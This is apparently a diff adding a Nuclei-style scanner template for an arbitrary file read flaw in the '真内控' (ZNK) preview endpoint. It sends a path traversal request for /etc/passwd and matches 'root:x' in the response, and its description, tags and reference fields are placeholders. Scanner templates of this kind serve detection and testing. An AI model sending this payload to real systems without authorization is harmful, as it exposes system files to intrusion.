@@ -1,0 +1,19 @@
+id: ZNK-preview-fileread
+info:
+  name: 真内控-ZNK-preview-任意文件读取漏洞
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x'
